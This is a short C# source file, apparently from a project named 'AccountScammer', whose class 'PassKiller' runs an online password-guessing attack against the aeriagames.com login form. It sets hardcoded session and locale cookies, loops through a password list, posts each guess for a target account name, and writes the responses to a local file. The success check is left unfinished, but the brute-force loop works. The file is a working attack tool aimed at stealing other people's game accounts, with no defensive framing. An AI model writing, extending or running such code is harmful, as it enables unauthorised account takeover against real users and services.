using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Webutil = WebUtil.WebUtil;

namespace AccountScammer {

	public static class PassKiller {
		public static List<string> UrlParams = new List<string>();

		private const int PARAM_USER = 3;
		private const int PARAM_PASS = 5;


		public static void Initialize() {
			UrlParams.Add( "edit[form_id]" );
			UrlParams.Add( "user_login" );
			UrlParams.Add( "edit[name]" );
			UrlParams.Add( "dummy_user" );
			UrlParams.Add( "edit[pass]" );
			UrlParams.Add( "dummy_pass" );
			UrlParams.Add( "op" );
			UrlParams.Add( "Einloggen" );
			Webutil.Cookies.Add( new System.Net.Cookie( "AGESESSID", "2d04af51f3483d800009f91df683370b", "/", "aeriagames.com" ) );
			Webutil.Cookies.Add( new System.Net.Cookie( "lang", "de", "/", "aeriagames.com" ) );
			Webutil.Cookies.Add( new System.Net.Cookie( "cur", "EUR", "/", "aeriagames.com" ) );
			Webutil.Cookies.Add( new System.Net.Cookie( "aeria_meebo_enableD", "Y", "/", "aeriagames.com" ) );
		}

		public static bool TryCrack( string Accountname, out string Password ) {
			WebUtil.PostResult result;
			Password = "";
			UrlParams[ PARAM_USER ] = Accountname;
			for( int i = 0; i < Program.Passwords.Length; i++ ) {
				UrlParams[ PARAM_PASS ] = Program.Passwords[ i ];

				result = Webutil.GetPage( Program.Website, Program.WebsiteRefer, WebUtil.PostRequest.PostTypeEnum.Post, UrlParams );
				System.IO.File.WriteAllText( @"D:\Desktop\C# Projects\Shaiya Tools\Account Scammer\AccountScammer\bin\Debug\dump.html", result.ResponseString );
			}

			return true;
		}

	}


}
